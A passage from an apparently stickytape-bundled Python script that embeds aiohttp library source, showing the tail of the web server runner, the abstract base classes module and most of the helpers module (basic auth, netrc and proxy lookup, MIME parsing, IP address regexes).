ssl_context=ssl_context,\r\n                            backlog=backlog,\r\n                            reuse_address=reuse_address,\r\n                            reuse_port=reuse_port,\r\n                        )\r\n                    )\r\n        elif path is None and sock is None or port is not None:\r\n            sites.append(\r\n                TCPSite(\r\n                    runner,\r\n                    port=port,\r\n                    shutdown_timeout=shutdown_timeout,\r\n                    ssl_context=ssl_context,\r\n                    backlog=backlog,\r\n                    reuse_address=reuse_address,\r\n                    reuse_port=reuse_port,\r\n                )\r\n            )\r\n\r\n        if path is not None:\r\n            if isinstance(path, (str, bytes, bytearray, memoryview)):\r\n                sites.append(\r\n                    UnixSite(\r\n                        runner,\r\n                        path,\r\n                        shutdown_timeout=shutdown_timeout,\r\n                        ssl_context=ssl_context,\r\n                        backlog=backlog,\r\n                    )\r\n                )\r\n            else:\r\n                for p in path:\r\n                    sites.append(\r\n                        UnixSite(\r\n                            runner,\r\n                            p,\r\n                            shutdown_timeout=shutdown_timeout,\r\n                            ssl_context=ssl_context,\r\n                            backlog=backlog,\r\n                        )\r\n                    )\r\n\r\n        if sock is not None:\r\n            if not isinstance(sock, Iterable):\r\n                sites.append(\r\n                    SockSite(\r\n                        runner,\r\n                        sock,\r\n                        shutdown_timeout=shutdown_timeout,\r\n                        ssl_context=ssl_context,\r\n                        backlog=backlog,\r\n                    )\r\n                )\r\n            else:\r\n                for s in sock:\r\n                    sites.append(\r\n                        SockSite(\r\n                            runner,\r\n                            s,\r\n                            shutdown_timeout=shutdown_timeout,\r\n                            ssl_context=ssl_context,\r\n                            backlog=backlog,\r\n                        )\r\n                    )\r\n        for site in sites:\r\n            await site.start()\r\n\r\n        if print:  # pragma: no branch\r\n            names = sorted(str(s.name) for s in runner.sites)\r\n            print(\r\n                "======== Running on {} ========\\n"\r\n                "(Press CTRL+C to quit)".format(", ".join(names))\r\n            )\r\n\r\n        # sleep forever by 1 hour intervals,\r\n        # on Windows before Python 3.8 wake up every 1 second to handle\r\n        # Ctrl+C smoothly\r\n        if sys.platform == "win32" and sys.version_info < (3, 8):\r\n            delay = 1\r\n        else:\r\n            delay = 3600\r\n\r\n        while True:\r\n            await asyncio.sleep(delay)\r\n    finally:\r\n        await runner.cleanup()\r\n\r\n\r\ndef _cancel_tasks(\r\n    to_cancel: Set["asyncio.Task[Any]"], loop: asyncio.AbstractEventLoop\r\n) -> None:\r\n    if not to_cancel:\r\n        return\r\n\r\n    for task in to_cancel:\r\n        task.cancel()\r\n\r\n    loop.run_until_complete(asyncio.gather(*to_cancel, return_exceptions=True))\r\n\r\n    for task in to_cancel:\r\n        if task.cancelled():\r\n            continue\r\n        if task.exception() is not None:\r\n            loop.call_exception_handler(\r\n                {\r\n                    "message": "unhandled exception during asyncio.run() shutdown",\r\n                    "exception": task.exception(),\r\n                    "task": task,\r\n                }\r\n            )\r\n\r\n\r\ndef run_app(\r\n    app: Union[Application, Awaitable[Application]],\r\n    *,\r\n    host: Optional[Union[str, HostSequence]] = None,\r\n    port: Optional[int] = None,\r\n    path: Optional[str] = None,\r\n    sock: Optional[socket.socket] = None,\r\n    shutdown_timeout: float = 60.0,\r\n    keepalive_timeout: float = 75.0,\r\n    ssl_context: Optional[SSLContext] = None,\r\n    print: Callable[..., None] = print,\r\n    backlog: int = 128,\r\n    access_log_class: Type[AbstractAccessLogger] = AccessLogger,\r\n    access_log_format: str = AccessLogger.LOG_FORMAT,\r\n    access_log: Optional[logging.Logger] = access_logger,\r\n    handle_signals: bool = True,\r\n    reuse_address: Optional[bool] = None,\r\n    reuse_port: Optional[bool] = None,\r\n    loop: Optional[asyncio.AbstractEventLoop] = None,\r\n) -> None:\r\n    """Run an app locally"""\r\n    if loop is None:\r\n        loop = asyncio.new_event_loop()\r\n\r\n    # Configure if and only if in debugging mode and using the default logger\r\n    if loop.get_debug() and access_log and access_log.name == "aiohttp.access":\r\n        if access_log.level == logging.NOTSET:\r\n            access_log.setLevel(logging.DEBUG)\r\n        if not access_log.hasHandlers():\r\n            access_log.addHandler(logging.StreamHandler())\r\n\r\n    main_task = loop.create_task(\r\n        _run_app(\r\n            app,\r\n            host=host,\r\n            port=port,\r\n            path=path,\r\n            sock=sock,\r\n            shutdown_timeout=shutdown_timeout,\r\n            keepalive_timeout=keepalive_timeout,\r\n            ssl_context=ssl_context,\r\n            print=print,\r\n            backlog=backlog,\r\n            access_log_class=access_log_class,\r\n            access_log_format=access_log_format,\r\n            access_log=access_log,\r\n            handle_signals=handle_signals,\r\n            reuse_address=reuse_address,\r\n            reuse_port=reuse_port,\r\n        )\r\n    )\r\n\r\n    try:\r\n        asyncio.set_event_loop(loop)\r\n        loop.run_until_complete(main_task)\r\n    except (GracefulExit, KeyboardInterrupt):  # pragma: no cover\r\n        pass\r\n    finally:\r\n        _cancel_tasks({main_task}, loop)\r\n        _cancel_tasks(all_tasks(loop), loop)\r\n        loop.run_until_complete(loop.shutdown_asyncgens())\r\n        loop.close()\r\n\r\n\r\ndef main(argv: List[str]) -> None:\r\n    arg_parser = ArgumentParser(\r\n        description="aiohttp.web Application server", prog="aiohttp.web"\r\n    )\r\n    arg_parser.add_argument(\r\n        "entry_func",\r\n        help=(\r\n            "Callable returning the `aiohttp.web.Application` instance to "\r\n            "run. Should be specified in the \'module:function\' syntax."\r\n        ),\r\n        metavar="entry-func",\r\n    )\r\n    arg_parser.add_argument(\r\n        "-H",\r\n        "--hostname",\r\n        help="TCP/IP hostname to serve on (default: %(default)r)",\r\n        default="localhost",\r\n    )\r\n    arg_parser.add_argument(\r\n        "-P",\r\n        "--port",\r\n        help="TCP/IP port to serve on (default: %(default)r)",\r\n        type=int,\r\n        default="8080",\r\n    )\r\n    arg_parser.add_argument(\r\n        "-U",\r\n        "--path",\r\n        help="Unix file system path to serve on. Specifying a path will cause "\r\n        "hostname and port arguments to be ignored.",\r\n    )\r\n    args, extra_argv = arg_parser.parse_known_args(argv)\r\n\r\n    # Import logic\r\n    mod_str, _, func_str = args.entry_func.partition(":")\r\n    if not func_str or not mod_str:\r\n        arg_parser.error("\'entry-func\' not in \'module:function\' syntax")\r\n    if mod_str.startswith("."):\r\n        arg_parser.error("relative module names not supported")\r\n    try:\r\n        module = import_module(mod_str)\r\n    except ImportError as ex:\r\n        arg_parser.error(f"unable to import {mod_str}: {ex}")\r\n    try:\r\n        func = getattr(module, func_str)\r\n    except AttributeError:\r\n        arg_parser.error(f"module {mod_str!r} has no attribute {func_str!r}")\r\n\r\n    # Compatibility logic\r\n    if args.path is not None and not hasattr(socket, "AF_UNIX"):\r\n        arg_parser.error(\r\n            "file system paths not supported by your operating" " environment"\r\n        )\r\n\r\n    logging.basicConfig(level=logging.DEBUG)\r\n\r\n    app = func(extra_argv)\r\n    run_app(app, host=args.hostname, port=args.port, path=args.path)\r\n    arg_parser.exit(message="Stopped\\n")\r\n\r\n\r\nif __name__ == "__main__":  # pragma: no branch\r\n    main(sys.argv[1:])  # pragma: no cover\r\n')
    __stickytape_write_module('aiohttp/abc.py', b'import asyncio\r\nimport logging\r\nfrom abc import ABC, abstractmethod\r\nfrom collections.abc import Sized\r\nfrom http.cookies import BaseCookie, Morsel\r\nfrom typing import (\r\n    TYPE_CHECKING,\r\n    Any,\r\n    Awaitable,\r\n    Callable,\r\n    Dict,\r\n    Generator,\r\n    Iterable,\r\n    List,\r\n    Optional,\r\n    Tuple,\r\n)\r\n\r\nfrom multidict import CIMultiDict\r\nfrom yarl import URL\r\n\r\nfrom .helpers import get_running_loop\r\nfrom .typedefs import LooseCookies\r\n\r\nif TYPE_CHECKING:  # pragma: no cover\r\n    from .web_app import Application\r\n    from .web_exceptions import HTTPException\r\n    from .web_request import BaseRequest, Request\r\n    from .web_response import StreamResponse\r\nelse:\r\n    BaseRequest = Request = Application = StreamResponse = None\r\n    HTTPException = None\r\n\r\n\r\nclass AbstractRouter(ABC):\r\n    def __init__(self) -> None:\r\n        self._frozen = False\r\n\r\n    def post_init(self, app: Application) -> None:\r\n        """Post init stage.\r\n\r\n        Not an abstract method for sake of backward compatibility,\r\n        but if the router wants to be aware of the application\r\n        it can override this.\r\n        """\r\n\r\n    @property\r\n    def frozen(self) -> bool:\r\n        return self._frozen\r\n\r\n    def freeze(self) -> None:\r\n        """Freeze router."""\r\n        self._frozen = True\r\n\r\n    @abstractmethod\r\n    async def resolve(self, request: Request) -> "AbstractMatchInfo":\r\n        """Return MATCH_INFO for given request"""\r\n\r\n\r\nclass AbstractMatchInfo(ABC):\r\n    @property  # pragma: no branch\r\n    @abstractmethod\r\n    def handler(self) -> Callable[[Request], Awaitable[StreamResponse]]:\r\n        """Execute matched request handler"""\r\n\r\n    @property\r\n    @abstractmethod\r\n    def expect_handler(self) -> Callable[[Request], Awaitable[None]]:\r\n        """Expect handler for 100-continue processing"""\r\n\r\n    @property  # pragma: no branch\r\n    @abstractmethod\r\n    def http_exception(self) -> Optional[HTTPException]:\r\n        """HTTPException instance raised on router\'s resolving, or None"""\r\n\r\n    @abstractmethod  # pragma: no branch\r\n    def get_info(self) -> Dict[str, Any]:\r\n        """Return a dict with additional info useful for introspection"""\r\n\r\n    @property  # pragma: no branch\r\n    @abstractmethod\r\n    def apps(self) -> Tuple[Application, ...]:\r\n        """Stack of nested applications.\r\n\r\n        Top level application is left-most element.\r\n\r\n        """\r\n\r\n    @abstractmethod\r\n    def add_app(self, app: Application) -> None:\r\n        """Add application to the nested apps stack."""\r\n\r\n    @abstractmethod\r\n    def freeze(self) -> None:\r\n        """Freeze the match info.\r\n\r\n        The method is called after route resolution.\r\n\r\n        After the call .add_app() is forbidden.\r\n\r\n        """\r\n\r\n\r\nclass AbstractView(ABC):\r\n    """Abstract class based view."""\r\n\r\n    def __init__(self, request: Request) -> None:\r\n        self._request = request\r\n\r\n    @property\r\n    def request(self) -> Request:\r\n        """Request instance."""\r\n        return self._request\r\n\r\n    @abstractmethod\r\n    def __await__(self) -> Generator[Any, None, StreamResponse]:\r\n        """Execute the view handler."""\r\n\r\n\r\nclass AbstractResolver(ABC):\r\n    """Abstract DNS resolver."""\r\n\r\n    @abstractmethod\r\n    async def resolve(self, host: str, port: int, family: int) -> List[Dict[str, Any]]:\r\n        """Return IP address for given hostname"""\r\n\r\n    @abstractmethod\r\n    async def close(self) -> None:\r\n        """Release resolver"""\r\n\r\n\r\nif TYPE_CHECKING:  # pragma: no cover\r\n    IterableBase = Iterable[Morsel[str]]\r\nelse:\r\n    IterableBase = Iterable\r\n\r\n\r\nClearCookiePredicate = Callable[["Morsel[str]"], bool]\r\n\r\n\r\nclass AbstractCookieJar(Sized, IterableBase):\r\n    """Abstract Cookie Jar."""\r\n\r\n    def __init__(self, *, loop: Optional[asyncio.AbstractEventLoop] = None) -> None:\r\n        self._loop = get_running_loop(loop)\r\n\r\n    @abstractmethod\r\n    def clear(self, predicate: Optional[ClearCookiePredicate] = None) -> None:\r\n        """Clear all cookies if no predicate is passed."""\r\n\r\n    @abstractmethod\r\n    def clear_domain(self, domain: str) -> None:\r\n        """Clear all cookies for domain and all subdomains."""\r\n\r\n    @abstractmethod\r\n    def update_cookies(self, cookies: LooseCookies, response_url: URL = URL()) -> None:\r\n        """Update cookies."""\r\n\r\n    @abstractmethod\r\n    def filter_cookies(self, request_url: URL) -> "BaseCookie[str]":\r\n        """Return the jar\'s cookies filtered by their attributes."""\r\n\r\n\r\nclass AbstractStreamWriter(ABC):\r\n    """Abstract stream writer."""\r\n\r\n    buffer_size = 0\r\n    output_size = 0\r\n    length = 0  # type: Optional[int]\r\n\r\n    @abstractmethod\r\n    async def write(self, chunk: bytes) -> None:\r\n        """Write chunk into stream."""\r\n\r\n    @abstractmethod\r\n    async def write_eof(self, chunk: bytes = b"") -> None:\r\n        """Write last chunk."""\r\n\r\n    @abstractmethod\r\n    async def drain(self) -> None:\r\n        """Flush the write buffer."""\r\n\r\n    @abstractmethod\r\n    def enable_compression(self, encoding: str = "deflate") -> None:\r\n        """Enable HTTP body compression"""\r\n\r\n    @abstractmethod\r\n    def enable_chunking(self) -> None:\r\n        """Enable HTTP chunked mode"""\r\n\r\n    @abstractmethod\r\n    async def write_headers(\r\n        self, status_line: str, headers: "CIMultiDict[str]"\r\n    ) -> None:\r\n        """Write HTTP headers"""\r\n\r\n\r\nclass AbstractAccessLogger(ABC):\r\n    """Abstract writer to access log."""\r\n\r\n    def __init__(self, logger: logging.Logger, log_format: str) -> None:\r\n        self.logger = logger\r\n        self.log_format = log_format\r\n\r\n    @abstractmethod\r\n    def log(self, request: BaseRequest, response: StreamResponse, time: float) -> None:\r\n        """Emit log to logger."""\r\n')
    __stickytape_write_module('aiohttp/helpers.py', b'"""Various helper functions"""\r\n\r\nimport asyncio\r\nimport base64\r\nimport binascii\r\nimport cgi\r\nimport datetime\r\nimport functools\r\nimport inspect\r\nimport netrc\r\nimport os\r\nimport platform\r\nimport re\r\nimport sys\r\nimport time\r\nimport warnings\r\nimport weakref\r\nfrom collections import namedtuple\r\nfrom contextlib import suppress\r\nfrom email.utils import parsedate\r\nfrom math import ceil\r\nfrom pathlib import Path\r\nfrom types import TracebackType\r\nfrom typing import (\r\n    Any,\r\n    Callable,\r\n    ContextManager,\r\n    Dict,\r\n    Generator,\r\n    Generic,\r\n    Iterable,\r\n    Iterator,\r\n    List,\r\n    Mapping,\r\n    Optional,\r\n    Pattern,\r\n    Set,\r\n    Tuple,\r\n    Type,\r\n    TypeVar,\r\n    Union,\r\n    cast,\r\n)\r\nfrom urllib.parse import quote\r\nfrom urllib.request import getproxies, proxy_bypass\r\n\r\nimport async_timeout\r\nimport attr\r\nfrom multidict import MultiDict, MultiDictProxy\r\nfrom yarl import URL\r\n\r\nfrom . import hdrs\r\nfrom .log import client_logger, internal_logger\r\nfrom .typedefs import PathLike, Protocol  # noqa\r\n\r\n__all__ = ("BasicAuth", "ChainMapProxy", "ETag")\r\n\r\nIS_MACOS = platform.system() == "Darwin"\r\nIS_WINDOWS = platform.system() == "Windows"\r\n\r\nPY_36 = sys.version_info >= (3, 6)\r\nPY_37 = sys.version_info >= (3, 7)\r\nPY_38 = sys.version_info >= (3, 8)\r\nPY_310 = sys.version_info >= (3, 10)\r\n\r\nif sys.version_info < (3, 7):\r\n    import idna_ssl\r\n\r\n    idna_ssl.patch_match_hostname()\r\n\r\n    def all_tasks(\r\n        loop: Optional[asyncio.AbstractEventLoop] = None,\r\n    ) -> Set["asyncio.Task[Any]"]:\r\n        tasks = list(asyncio.Task.all_tasks(loop))\r\n        return {t for t in tasks if not t.done()}\r\n\r\n\r\nelse:\r\n    all_tasks = asyncio.all_tasks\r\n\r\n\r\n_T = TypeVar("_T")\r\n_S = TypeVar("_S")\r\n\r\n\r\nsentinel = object()  # type: Any\r\nNO_EXTENSIONS = bool(os.environ.get("AIOHTTP_NO_EXTENSIONS"))  # type: bool\r\n\r\n# N.B. sys.flags.dev_mode is available on Python 3.7+, use getattr\r\n# for compatibility with older versions\r\nDEBUG = getattr(sys.flags, "dev_mode", False) or (\r\n    not sys.flags.ignore_environment and bool(os.environ.get("PYTHONASYNCIODEBUG"))\r\n)  # type: bool\r\n\r\n\r\nCHAR = {chr(i) for i in range(0, 128)}\r\nCTL = {chr(i) for i in range(0, 32)} | {\r\n    chr(127),\r\n}\r\nSEPARATORS = {\r\n    "(",\r\n    ")",\r\n    "<",\r\n    ">",\r\n    "@",\r\n    ",",\r\n    ";",\r\n    ":",\r\n    "\\\\",\r\n    \'"\',\r\n    "/",\r\n    "[",\r\n    "]",\r\n    "?",\r\n    "=",\r\n    "{",\r\n    "}",\r\n    " ",\r\n    chr(9),\r\n}\r\nTOKEN = CHAR ^ CTL ^ SEPARATORS\r\n\r\n\r\nclass noop:\r\n    def __await__(self) -> Generator[None, None, None]:\r\n        yield\r\n\r\n\r\nclass BasicAuth(namedtuple("BasicAuth", ["login", "password", "encoding"])):\r\n    """Http basic authentication helper."""\r\n\r\n    def __new__(\r\n        cls, login: str, password: str = "", encoding: str = "latin1"\r\n    ) -> "BasicAuth":\r\n        if login is None:\r\n            raise ValueError("None is not allowed as login value")\r\n\r\n        if password is None:\r\n            raise ValueError("None is not allowed as password value")\r\n\r\n        if ":" in login:\r\n            raise ValueError(\'A ":" is not allowed in login (RFC 1945#section-11.1)\')\r\n\r\n        return super().__new__(cls, login, password, encoding)\r\n\r\n    @classmethod\r\n    def decode(cls, auth_header: str, encoding: str = "latin1") -> "BasicAuth":\r\n        """Create a BasicAuth object from an Authorization HTTP header."""\r\n        try:\r\n            auth_type, encoded_credentials = auth_header.split(" ", 1)\r\n        except ValueError:\r\n            raise ValueError("Could not parse authorization header.")\r\n\r\n        if auth_type.lower() != "basic":\r\n            raise ValueError("Unknown authorization method %s" % auth_type)\r\n\r\n        try:\r\n            decoded = base64.b64decode(\r\n                encoded_credentials.encode("ascii"), validate=True\r\n            ).decode(encoding)\r\n        except binascii.Error:\r\n            raise ValueError("Invalid base64 encoding.")\r\n\r\n        try:\r\n            # RFC 2617 HTTP Authentication\r\n            # https://www.ietf.org/rfc/rfc2617.txt\r\n            # the colon must be present, but the username and password may be\r\n            # otherwise blank.\r\n            username, password = decoded.split(":", 1)\r\n        except ValueError:\r\n            raise ValueError("Invalid credentials.")\r\n\r\n        return cls(username, password, encoding=encoding)\r\n\r\n    @classmethod\r\n    def from_url(cls, url: URL, *, encoding: str = "latin1") -> Optional["BasicAuth"]:\r\n        """Create BasicAuth from url."""\r\n        if not isinstance(url, URL):\r\n            raise TypeError("url should be yarl.URL instance")\r\n        if url.user is None:\r\n            return None\r\n        return cls(url.user, url.password or "", encoding=encoding)\r\n\r\n    def encode(self) -> str:\r\n        """Encode credentials."""\r\n        creds = (f"{self.login}:{self.password}").encode(self.encoding)\r\n        return "Basic %s" % base64.b64encode(creds).decode(self.encoding)\r\n\r\n\r\ndef strip_auth_from_url(url: URL) -> Tuple[URL, Optional[BasicAuth]]:\r\n    auth = BasicAuth.from_url(url)\r\n    if auth is None:\r\n        return url, None\r\n    else:\r\n        return url.with_user(None), auth\r\n\r\n\r\ndef netrc_from_env() -> Optional[netrc.netrc]:\r\n    """Load netrc from file.\r\n\r\n    Attempt to load it from the path specified by the env-var\r\n    NETRC or in the default location in the user\'s home directory.\r\n\r\n    Returns None if it couldn\'t be found or fails to parse.\r\n    """\r\n    netrc_env = os.environ.get("NETRC")\r\n\r\n    if netrc_env is not None:\r\n        netrc_path = Path(netrc_env)\r\n    else:\r\n        try:\r\n            home_dir = Path.home()\r\n        except RuntimeError as e:  # pragma: no cover\r\n            # if pathlib can\'t resolve home, it may raise a RuntimeError\r\n            client_logger.debug(\r\n                "Could not resolve home directory when "\r\n                "trying to look for .netrc file: %s",\r\n                e,\r\n            )\r\n            return None\r\n\r\n        netrc_path = home_dir / ("_netrc" if IS_WINDOWS else ".netrc")\r\n\r\n    try:\r\n        return netrc.netrc(str(netrc_path))\r\n    except netrc.NetrcParseError as e:\r\n        client_logger.warning("Could not parse .netrc file: %s", e)\r\n    except OSError as e:\r\n        # we couldn\'t read the file (doesn\'t exist, permissions, etc.)\r\n        if netrc_env or netrc_path.is_file():\r\n            # only warn if the environment wanted us to load it,\r\n            # or it appears like the default file does actually exist\r\n            client_logger.warning("Could not read .netrc file: %s", e)\r\n\r\n    return None\r\n\r\n\r\n@attr.s(auto_attribs=True, frozen=True, slots=True)\r\nclass ProxyInfo:\r\n    proxy: URL\r\n    proxy_auth: Optional[BasicAuth]\r\n\r\n\r\ndef proxies_from_env() -> Dict[str, ProxyInfo]:\r\n    proxy_urls = {\r\n        k: URL(v)\r\n        for k, v in getproxies().items()\r\n        if k in ("http", "https", "ws", "wss")\r\n    }\r\n    netrc_obj = netrc_from_env()\r\n    stripped = {k: strip_auth_from_url(v) for k, v in proxy_urls.items()}\r\n    ret = {}\r\n    for proto, val in stripped.items():\r\n        proxy, auth = val\r\n        if proxy.scheme in ("https", "wss"):\r\n            client_logger.warning(\r\n                "%s proxies %s are not supported, ignoring", proxy.scheme.upper(), proxy\r\n            )\r\n            continue\r\n        if netrc_obj and auth is None:\r\n            auth_from_netrc = None\r\n            if proxy.host is not None:\r\n                auth_from_netrc = netrc_obj.authenticators(proxy.host)\r\n            if auth_from_netrc is not None:\r\n                # auth_from_netrc is a (`user`, `account`, `password`) tuple,\r\n                # `user` and `account` both can be username,\r\n                # if `user` is None, use `account`\r\n                *logins, password = auth_from_netrc\r\n                login = logins[0] if logins[0] else logins[-1]\r\n                auth = BasicAuth(cast(str, login), cast(str, password))\r\n        ret[proto] = ProxyInfo(proxy, auth)\r\n    return ret\r\n\r\n\r\ndef current_task(\r\n    loop: Optional[asyncio.AbstractEventLoop] = None,\r\n) -> "Optional[asyncio.Task[Any]]":\r\n    if sys.version_info >= (3, 7):\r\n        return asyncio.current_task(loop=loop)\r\n    else:\r\n        return asyncio.Task.current_task(loop=loop)\r\n\r\n\r\ndef get_running_loop(\r\n    loop: Optional[asyncio.AbstractEventLoop] = None,\r\n) -> asyncio.AbstractEventLoop:\r\n    if loop is None:\r\n        loop = asyncio.get_event_loop()\r\n    if not loop.is_running():\r\n        warnings.warn(\r\n            "The object should be created within an async function",\r\n            DeprecationWarning,\r\n            stacklevel=3,\r\n        )\r\n        if loop.get_debug():\r\n            internal_logger.warning(\r\n                "The object should be created within an async function", stack_info=True\r\n            )\r\n    return loop\r\n\r\n\r\ndef isasyncgenfunction(obj: Any) -> bool:\r\n    func = getattr(inspect, "isasyncgenfunction", None)\r\n    if func is not None:\r\n        return func(obj)  # type: ignore[no-any-return]\r\n    else:\r\n        return False\r\n\r\n\r\ndef get_env_proxy_for_url(url: URL) -> Tuple[URL, Optional[BasicAuth]]:\r\n    """Get a permitted proxy for the given URL from the env."""\r\n    if url.host is not None and proxy_bypass(url.host):\r\n        raise LookupError(f"Proxying is disallowed for `{url.host!r}`")\r\n\r\n    proxies_in_env = proxies_from_env()\r\n    try:\r\n        proxy_info = proxies_in_env[url.scheme]\r\n    except KeyError:\r\n        raise LookupError(f"No proxies found for `{url!s}` in the env")\r\n    else:\r\n        return proxy_info.proxy, proxy_info.proxy_auth\r\n\r\n\r\n@attr.s(auto_attribs=True, frozen=True, slots=True)\r\nclass MimeType:\r\n    type: str\r\n    subtype: str\r\n    suffix: str\r\n    parameters: "MultiDictProxy[str]"\r\n\r\n\r\n@functools.lru_cache(maxsize=56)\r\ndef parse_mimetype(mimetype: str) -> MimeType:\r\n    """Parses a MIME type into its components.\r\n\r\n    mimetype is a MIME type string.\r\n\r\n    Returns a MimeType object.\r\n\r\n    Example:\r\n\r\n    >>> parse_mimetype(\'text/html; charset=utf-8\')\r\n    MimeType(type=\'text\', subtype=\'html\', suffix=\'\',\r\n             parameters={\'charset\': \'utf-8\'})\r\n\r\n    """\r\n    if not mimetype:\r\n        return MimeType(\r\n            type="", subtype="", suffix="", parameters=MultiDictProxy(MultiDict())\r\n        )\r\n\r\n    parts = mimetype.split(";")\r\n    params = MultiDict()  # type: MultiDict[str]\r\n    for item in parts[1:]:\r\n        if not item:\r\n            continue\r\n        key, value = cast(\r\n            Tuple[str, str], item.split("=", 1) if "=" in item else (item, "")\r\n        )\r\n        params.add(key.lower().strip(), value.strip(\' "\'))\r\n\r\n    fulltype = parts[0].strip().lower()\r\n    if fulltype == "*":\r\n        fulltype = "*/*"\r\n\r\n    mtype, stype = (\r\n        cast(Tuple[str, str], fulltype.split("/", 1))\r\n        if "/" in fulltype\r\n        else (fulltype, "")\r\n    )\r\n    stype, suffix = (\r\n        cast(Tuple[str, str], stype.split("+", 1)) if "+" in stype else (stype, "")\r\n    )\r\n\r\n    return MimeType(\r\n        type=mtype, subtype=stype, suffix=suffix, parameters=MultiDictProxy(params)\r\n    )\r\n\r\n\r\ndef guess_filename(obj: Any, default: Optional[str] = None) -> Optional[str]:\r\n    name = getattr(obj, "name", None)\r\n    if name and isinstance(name, str) and name[0] != "<" and name[-1] != ">":\r\n        return Path(name).name\r\n    return default\r\n\r\n\r\nnot_qtext_re = re.compile(r"[^\\041\\043-\\133\\135-\\176]")\r\nQCONTENT = {chr(i) for i in range(0x20, 0x7F)} | {"\\t"}\r\n\r\n\r\ndef quoted_string(content: str) -> str:\r\n    """Return 7-bit content as quoted-string.\r\n\r\n    Format content into a quoted-string as defined in RFC5322 for\r\n    Internet Message Format. Notice that this is not the 8-bit HTTP\r\n    format, but the 7-bit email format. Content must be in usascii or\r\n    a ValueError is raised.\r\n    """\r\n    if not (QCONTENT > set(content)):\r\n        raise ValueError(f"bad content for quoted-string {content!r}")\r\n    return not_qtext_re.sub(lambda x: "\\\\" + x.group(0), content)\r\n\r\n\r\ndef content_disposition_header(\r\n    disptype: str, quote_fields: bool = True, _charset: str = "utf-8", **params: str\r\n) -> str:\r\n    """Sets ``Content-Disposition`` header for MIME.\r\n\r\n    This is the MIME payload Content-Disposition header from RFC 2183\r\n    and RFC 7579 section 4.2, not the HTTP Content-Disposition from\r\n    RFC 6266.\r\n\r\n    disptype is a disposition type: inline, attachment, form-data.\r\n    Should be valid extension token (see RFC 2183)\r\n\r\n    quote_fields performs value quoting to 7-bit MIME headers\r\n    according to RFC 7578. Set to quote_fields to False if recipient\r\n    can take 8-bit file names and field values.\r\n\r\n    _charset specifies the charset to use when quote_fields is True.\r\n\r\n    params is a dict with disposition params.\r\n    """\r\n    if not disptype or not (TOKEN > set(disptype)):\r\n        raise ValueError("bad content disposition type {!r}" "".format(disptype))\r\n\r\n    value = disptype\r\n    if params:\r\n        lparams = []\r\n        for key, val in params.items():\r\n            if not key or not (TOKEN > set(key)):\r\n                raise ValueError(\r\n                    "bad content disposition parameter" " {!r}={!r}".format(key, val)\r\n                )\r\n            if quote_fields:\r\n                if key.lower() == "filename":\r\n                    qval = quote(val, "", encoding=_charset)\r\n                    lparams.append((key, \'"%s"\' % qval))\r\n                else:\r\n                    try:\r\n                        qval = quoted_string(val)\r\n                    except ValueError:\r\n                        qval = "".join(\r\n                            (_charset, "\'\'", quote(val, "", encoding=_charset))\r\n                        )\r\n                        lparams.append((key + "*", qval))\r\n                    else:\r\n                        lparams.append((key, \'"%s"\' % qval))\r\n            else:\r\n                qval = val.replace("\\\\", "\\\\\\\\").replace(\'"\', \'\\\\"\')\r\n                lparams.append((key, \'"%s"\' % qval))\r\n        sparams = "; ".join("=".join(pair) for pair in lparams)\r\n        value = "; ".join((value, sparams))\r\n    return value\r\n\r\n\r\nclass _TSelf(Protocol, Generic[_T]):\r\n    _cache: Dict[str, _T]\r\n\r\n\r\nclass reify(Generic[_T]):\r\n    """Use as a class method decorator.\r\n\r\n    It operates almost exactly like\r\n    the Python `@property` decorator, but it puts the result of the\r\n    method it decorates into the instance dict after the first call,\r\n    effectively replacing the function it decorates with an instance\r\n    variable.  It is, in Python parlance, a data descriptor.\r\n    """\r\n\r\n    def __init__(self, wrapped: Callable[..., _T]) -> None:\r\n        self.wrapped = wrapped\r\n        self.__doc__ = wrapped.__doc__\r\n        self.name = wrapped.__name__\r\n\r\n    def __get__(self, inst: _TSelf[_T], owner: Optional[Type[Any]] = None) -> _T:\r\n        try:\r\n            try:\r\n                return inst._cache[self.name]\r\n            except KeyError:\r\n                val = self.wrapped(inst)\r\n                inst._cache[self.name] = val\r\n                return val\r\n        except AttributeError:\r\n            if inst is None:\r\n                return self\r\n            raise\r\n\r\n    def __set__(self, inst: _TSelf[_T], value: _T) -> None:\r\n        raise AttributeError("reified property is read-only")\r\n\r\n\r\nreify_py = reify\r\n\r\ntry:\r\n    from ._helpers import reify as reify_c\r\n\r\n    if not NO_EXTENSIONS:\r\n        reify = reify_c  # type: ignore[misc,assignment]\r\nexcept ImportError:\r\n    pass\r\n\r\n_ipv4_pattern = (\r\n    r"^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.){3}"\r\n    r"(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$"\r\n)\r\n_ipv6_pattern = (\r\n    r"^(?:(?:(?:[A-F0-9]{1,4}:){6}|(?=(?:[A-F0-9]{0,4}:){0,6}"\r\n    r"(?:[0-9]{1,3}\\.){3}[0-9]{1,3}$)(([0-9A-F]{1,4}:){0,5}|:)"\r\n    r"((:[0-9A-F]{1,4}){1,5}:|:)|::(?:[A-F0-9]{1,4}:){5})"\r\n    r"(?:(?:25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])\\.){3}"\r\n    r"(?:25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])|(?:[A-F0-9]{1,4}:){7}"\r\n    r"[A-F0-9]{1,4}|(?=(?:[A-F0-9]{0,4}:){0,7}[A-F0-9]{0,4}$)"\r\n    r"(([0-9A-F]{1,4}:){1,7}|:)((:[0-9A-F]{1,4}){1,7}|:)|(?:[A-F0-9]{1,4}:){7}"\r\n    r":|:(:[A-F0-9]{1,4}){7})$"\r\n)\r\n_ipv4_regex = re.compile(_ipv4_pattern)\r\n_ipv6_regex = re.compile(_ipv6_pattern, flags=re.IGNORECASE)\r\n_ipv4_regexb = re.compile(_ipv4_pattern.encode("ascii"))\r\n_ipv6_regexb = re.compile(_ipv6_pattern.encode("ascii"), flags=re.IGNORECASE)\r\n\r\n\r\ndef _is_ip_address(\r\n    regex: Pattern[str], regexb: Pattern[bytes], host: Optional[Union[str, bytes]]\r\n) -> bool:\r\n    if host is None:\r\n        return False\r\n    if isinstance(host, str):\r\n        return bool(regex.match(host))\r\n    elif isinstance(host, (bytes, bytearray, memoryview)):\r\n        return bool(regexb.match(host))\r\n    else:\r\n        raise TypeError(f"{host} [{type(host)}] is not a str or bytes")\r\n\r\n\r\nis_ipv4_address = functools.partial(_is_ip_address, _ipv4_regex, _ipv4_regexb)\r\nis_ipv6_address = functools.partial(_is_ip_address, _ipv6_regex, 